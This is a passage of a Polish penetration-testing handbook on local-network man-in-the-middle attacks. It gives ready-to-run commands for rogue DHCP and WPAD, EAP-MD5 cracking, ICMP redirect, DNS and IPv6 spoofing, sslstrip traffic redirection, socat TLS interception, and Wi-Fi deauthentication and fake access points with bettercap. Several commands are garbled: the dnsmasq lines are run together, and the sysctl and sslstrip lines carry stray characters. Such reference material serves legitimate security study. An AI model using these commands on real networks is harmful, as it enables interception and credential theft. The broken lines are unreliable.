Nielegalny serwer DHCP można skonfigurować za pomocą skryptu DHCP znajdującego się w `/usr/share/responder/DHCP.py`. Jest to przydatne w atakach sieciowych, takich jak przechwytywanie ruchu HTTP i poświadczeń, poprzez przekierowywanie ruchu do złośliwego serwera. Jednak ustawienie nielegalnej bramy jest mniej skuteczne, ponieważ pozwala jedynie na przechwytywanie ruchu wychodzącego z klienta, pomijając odpowiedzi z prawdziwej bramy. Zamiast tego zaleca się skonfigurowanie nielegalnego serwera DNS lub WPAD dla bardziej skutecznego ataku.

Poniżej znajdują się opcje poleceń do skonfigurowania nielegalnego serwera DHCP:

- **Nasz adres IP (Ogłoszenie bramy)**: Użyj `-i 10.0.0.100`, aby ogłosić adres IP swojej maszyny jako bramę.
- **Lokalna nazwa domeny DNS**: Opcjonalnie użyj `-d example.org`, aby ustawić lokalną nazwę domeny DNS.
- **Oryginalny adres IP routera/bramy**: Użyj `-r 10.0.0.1`, aby określić adres IP legalnego routera lub bramy.
- **Adres IP głównego serwera DNS**: Użyj `-p 10.0.0.100`, aby ustawić adres IP nielegalnego serwera DNS, który kontrolujesz.
- **Adres IP drugiego serwera DNS**: Opcjonalnie użyj `-s 10.0.0.1`, aby ustawić adres IP drugiego serwera DNS.
- **Maska podsieci lokalnej**: Użyj `-n 255.255.255.0`, aby zdefiniować maskę podsieci dla lokalnej sieci.
- **Interfejs dla ruchu DHCP**: Użyj `-I eth1`, aby nasłuchiwać ruchu DHCP na określonym interfejsie sieciowym.
- **Adres konfiguracji WPAD**: Użyj `-w “http://10.0.0.100/wpad.dat”`, aby ustawić adres dla konfiguracji WPAD, co pomoże w przechwytywaniu ruchu sieciowego.
- **Fałszowanie adresu IP domyślnej bramy**: Dodaj `-S`, aby sfałszować adres IP domyślnej bramy.
- **Odpowiadanie na wszystkie żądania DHCP**: Dodaj `-R`, aby serwer odpowiadał na wszystkie żądania DHCP, ale bądź świadomy, że jest to głośne i może być wykryte.

Poprawne użycie tych opcji pozwala na skuteczne utworzenie nielegalnego serwera DHCP do przechwytywania ruchu sieciowego.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataki EAP**

Oto niektóre z taktyk ataku, które można wykorzystać przeciwko implementacjom 802.1X:

- Aktywne łamanie haseł metodą brute-force za pomocą EAP
- Atakowanie serwera RADIUS z użyciem zniekształconych treści EAP _\*\*_(exploits)
- Przechwytywanie wiadomości EAP i łamanie haseł offline (EAP-MD5 i PEAP)
- Wymuszanie uwierzytelniania EAP-MD5 w celu ominięcia walidacji certyfikatu TLS
- Wstrzykiwanie złośliwego ruchu sieciowego podczas uwierzytelniania za pomocą huba lub podobnego urządzenia

Jeśli atakujący znajduje się pomiędzy ofiarą a serwerem uwierzytelniającym, może spróbować obniżyć (jeśli to konieczne) protokół uwierzytelniania do EAP-MD5 i przechwycić próbę uwierzytelnienia. Następnie może to złamać za pomocą:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### Ataki FHRP (GLBP i HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) to klasa protokołów sieciowych zaprojektowanych w celu **stworzenia gorącego systemu redundancji routingu**. Dzięki FHRP fizyczne routery mogą być łączone w jeden logiczny urządzenie, co zwiększa tolerancję na błędy i pomaga rozłożyć obciążenie.

**Inżynierowie Cisco Systems opracowali dwa protokoły FHRP, GLBP i HSRP.**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Znane są trzy wersje protokołu Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. Datagramy są wysyłane do sąsiadów przez port 520 przy użyciu UDP przez RIP i RIPv2, podczas gdy datagramy są rozgłaszane do portu UDP 521 za pomocą multicastu IPv6 przez RIPng. Obsługa uwierzytelniania MD5 została wprowadzona przez RIPv2. Z drugiej strony, natywne uwierzytelnianie nie jest włączone w RIPng; zamiast tego polega się na opcjonalnych nagłówkach IPsec AH i ESP w IPv6.

- **RIP i RIPv2:** Komunikacja odbywa się za pomocą datagramów UDP na porcie 520.
- **RIPng:** Wykorzystuje port UDP 521 do rozgłaszania datagramów za pomocą multicastu IPv6.

Należy zauważyć, że RIPv2 obsługuje uwierzytelnianie MD5, podczas gdy RIPng nie zawiera natywnego uwierzytelniania, polegając na nagłówkach IPsec AH i ESP w IPv6.

### Ataki EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** to dynamiczny protokół routingu. **Jest to protokół wektorowy odległości.** Jeśli nie ma **uwierzytelniania** i konfiguracji interfejsów pasywnych, **intruz** może zakłócić routing EIGRP i spowodować **zatrucie tabel routingu**. Ponadto sieć EIGRP (innymi słowy, autonomiczny system) **jest płaska i nie ma segmentacji na żadne strefy**. Jeśli **atakujący wstrzyknie trasę**, istnieje duże prawdopodobieństwo, że ta trasa **rozprzestrzeni się** w całym autonomicznym systemie EIGRP.

Aby zaatakować system EIGRP, należy **nawiązać sąsiedztwo z legalnym routerem EIGRP**, co otwiera wiele możliwości, od podstawowego rozpoznania po różne wstrzyknięcia.

[**FRRouting**](https://frrouting.org/) pozwala na wdrożenie **wirtualnego routera, który obsługuje BGP, OSPF, EIGRP, RIP i inne protokoły.** Wystarczy wdrożyć go na systemie atakującego, a można udawać legalny router w domenie routingu.

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) ma możliwości przechwytywania rozgłoszeń EIGRP (Enhanced Interior Gateway Routing Protocol). Umożliwia również wstrzykiwanie pakietów, które mogą być wykorzystane do zmiany konfiguracji routingu.

### OSPF

W protokole Open Shortest Path First (OSPF) **powszechnie stosuje się uwierzytelnianie MD5, aby zapewnić bezpieczną komunikację między routerami**. Jednak ten środek bezpieczeństwa może być naruszony za pomocą narzędzi takich jak Loki i John the Ripper. Narzędzia te są w stanie przechwytywać i łamać hashe MD5, ujawniając klucz uwierzytelniający. Po uzyskaniu tego klucza można go użyć do wprowadzenia nowych informacji routingu. Aby skonfigurować parametry trasy i ustawić skompromitowany klucz, wykorzystywane są odpowiednio zakładki _Injection_ i _Connection_.

- **Przechwytywanie i łamanie hashy MD5:** Narzędzia takie jak Loki i John the Ripper są używane do tego celu.
- **Konfigurowanie parametrów trasy:** Odbywa się to za pomocą zakładki _Injection_.
- **Ustawianie skompromitowanego klucza:** Klucz jest konfigurowany w zakładce _Connection_.

### Inne narzędzia i źródła ogólne

- [**Above**](https://github.com/c4s73r/Above): Narzędzie do skanowania ruchu sieciowego i znajdowania luk
- Możesz znaleźć **więcej informacji o atakach sieciowych** [**tutaj**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Atakujący konfiguruje wszystkie parametry sieciowe (GW, IP, DNS) nowego członka sieci, wysyłając fałszywe odpowiedzi DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Sprawdź [poprzednią sekcję](#arp-spoofing).

### ICMPRedirect

ICMP Redirect polega na wysyłaniu pakietu ICMP typu 1 kod 5, który wskazuje, że atakujący jest najlepszym sposobem dotarcia do danego adresu IP. Następnie, gdy ofiara chce skontaktować się z tym adresem IP, wyśle pakiet przez atakującego.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Atakujący rozwiąże niektóre (lub wszystkie) domeny, o które pyta ofiara.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Skonfiguruj własny DNS za pomocą dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalne bramy

Wiele tras do systemów i sieci często istnieje. Po zbudowaniu listy adresów MAC w lokalnej sieci, użyj _gateway-finder.py_, aby zidentyfikować hosty, które obsługują przekazywanie IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

W przypadku lokalnego rozwiązywania hostów, gdy zapytania DNS są nieudane, systemy Microsoftu polegają na **Link-Local Multicast Name Resolution (LLMNR)** oraz **NetBIOS Name Service (NBT-NS)**. Podobnie, **Apple Bonjour** i implementacje **Linux zero-configuration** wykorzystują **Multicast DNS (mDNS)** do odkrywania systemów w sieci. Z powodu nieautoryzowanej natury tych protokołów i ich działania przez UDP, wysyłając wiadomości, mogą być wykorzystywane przez atakujących, którzy mają na celu przekierowanie użytkowników do złośliwych usług.

Możesz podszywać się pod usługi, które są wyszukiwane przez hosty, używając Respondera do wysyłania fałszywych odpowiedzi.\
Przeczytaj tutaj więcej informacji o tym, [jak podszywać się pod usługi za pomocą Respondera](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Przeglądarki powszechnie wykorzystują **protokół Web Proxy Auto-Discovery (WPAD) do automatycznego pozyskiwania ustawień proxy**. Obejmuje to pobieranie szczegółów konfiguracyjnych z serwera, konkretnie przez URL taki jak "http://wpad.example.org/wpad.dat". Odkrycie tego serwera przez klientów może odbywać się za pomocą różnych mechanizmów:

- Przez **DHCP**, gdzie odkrycie jest ułatwione przez wykorzystanie specjalnego kodu 252.
- Przez **DNS**, co polega na wyszukiwaniu nazwy hosta oznaczonej jako _wpad_ w lokalnej domenie.
- Poprzez **Microsoft LLMNR i NBT-NS**, które są mechanizmami zapasowymi używanymi w przypadkach, gdy zapytania DNS nie powiodą się.

Narzędzie Responder wykorzystuje ten protokół, działając jako **złośliwy serwer WPAD**. Używa DHCP, DNS, LLMNR i NBT-NS, aby wprowadzić klientów w błąd, zmuszając ich do połączenia się z nim. Aby zgłębić, jak można podszywać się pod usługi za pomocą Respondera, [sprawdź to](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Możesz oferować różne usługi w sieci, aby spróbować **oszukać użytkownika** do wprowadzenia jakichś **jawnych poświadczeń**. **Więcej informacji o tym ataku w** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Ten atak jest bardzo podobny do ARP Spoofing, ale w świecie IPv6. Możesz sprawić, że ofiara pomyśli, że IPv6 GW ma MAC atakującego.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Niektóre systemy operacyjne domyślnie konfigurują bramę na podstawie pakietów RA wysyłanych w sieci. Aby zadeklarować atakującego jako router IPv6, możesz użyć:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Domyślnie niektóre systemy operacyjne próbują skonfigurować DNS, odczytując pakiet DHCPv6 w sieci. Wtedy atakujący może wysłać pakiet DHCPv6, aby skonfigurować się jako DNS. DHCP również zapewnia ofierze adres IPv6.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fałszywa strona i wstrzykiwanie kodu JS)

## Ataki internetowe

### sslStrip

W zasadzie to, co robi ten atak, to w przypadku, gdy **użytkownik** próbuje **uzyskać dostęp** do strony **HTTP**, która jest **przekierowywana** na wersję **HTTPS**. **sslStrip** będzie **utrzymywać** połączenie **HTTP z** **klientem** i połączenie **HTTPS z** **serwerem**, dzięki czemu będzie w stanie **podsłuchiwać** połączenie w **czystym tekście**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Więcej informacji [tutaj](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy do omijania HSTS

**Różnica** między **sslStrip+ a dns2proxy** a **sslStrip** polega na tym, że będą **przekierowywać** na przykład _**www.facebook.com**_ **na** _**wwww.facebook.com**_ (zauważ **dodatkowe** "**w**") i ustawią **adres tej domeny jako IP atakującego**. W ten sposób **klient** będzie **łączyć się** z _**wwww.facebook.com**_ **(atakujący)**, ale w tle **sslstrip+** będzie **utrzymywać** **prawdziwe połączenie** przez https z **www.facebook.com**.

**Celem** tej techniki jest **unikanie HSTS**, ponieważ _**wwww**.facebook.com_ **nie będzie** zapisane w **pamięci podręcznej** przeglądarki, więc przeglądarka zostanie oszukana, aby wykonać **uwierzytelnienie facebooka w HTTP**.\
Zauważ, że aby przeprowadzić ten atak, ofiara musi najpierw spróbować uzyskać dostęp do [http://www.faceook.com](http://www.faceook.com), a nie https. Można to zrobić, modyfikując linki wewnątrz strony http.

Więcej informacji [tutaj](https://www.bettercap.org/legacy/#hsts-bypass), [tutaj](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [tutaj](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip lub sslStrip+ już nie działają. Dzieje się tak, ponieważ w przeglądarkach są zapisane zasady HSTS, więc nawet jeśli to pierwszy raz, gdy użytkownik uzyskuje dostęp do "ważnej" domeny, uzyska do niej dostęp przez HTTPS. Zauważ również, że zapisane zasady i inne generowane zasady mogą używać flagi** [**`includeSubdomains`**](https://hstspreload.appspot.com) **więc przykład _**wwww.facebook.com**_ **z poprzedniego nie zadziała, ponieważ** _**facebook.com**_ **używa HSTS z `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Nasłuchiwanie TCP na porcie
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL nasłuch na porcie

#### Generowanie kluczy i certyfikatu samopodpisanego
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Słuchaj za pomocą certyfikatu
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Słuchaj za pomocą certyfikatu i przekieruj do hostów
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Czasami, jeśli klient sprawdzi, że CA jest ważne, możesz **serwować certyfikat innej nazwy hosta podpisany przez CA**.\
Innym interesującym testem jest **serwowanie certyfikatu żądanej nazwy hosta, ale samopodpisanego**.

Inne rzeczy do przetestowania to próba podpisania certyfikatu ważnym certyfikatem, który nie jest ważnym CA. Lub użycie ważnego klucza publicznego, wymuszenie użycia algorytmu takiego jak Diffie-Hellman (takiego, który nie wymaga odszyfrowania czegokolwiek za pomocą prawdziwego klucza prywatnego) i gdy klient poprosi o próbkę prawdziwego klucza prywatnego (jak hasz), wysłanie fałszywej próbki i oczekiwanie, że klient tego nie sprawdzi.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notatki dotyczące aktywnego odkrywania

Weź pod uwagę, że gdy pakiet UDP jest wysyłany do urządzenia, które nie ma żądanego portu, wysyłany jest komunikat ICMP (Port Unreachable).

### **ARP discover**

Pakiety ARP są używane do odkrywania, które adresy IP są używane w sieci. Komputer musi wysłać zapytanie dla każdego możliwego adresu IP, a tylko te, które są używane, odpowiedzą.

### **mDNS (multicast DNS)**

Bettercap wysyła zapytanie MDNS (co X ms) pytając o **\_services\_.dns-sd.\_udp.local**, maszyna, która widzi ten pakiet, zazwyczaj odpowiada na to zapytanie. Następnie wyszukuje tylko maszyny odpowiadające na "services".

**Narzędzia**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap wysyła pakiety broadcast do portu 137/UDP pytając o nazwę "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap wysyła pakiety SSDP broadcast w poszukiwaniu wszelkiego rodzaju usług (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap wysyła pakiety WSD broadcast w poszukiwaniu usług (UDP Port 3702).

## Odniesienia

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
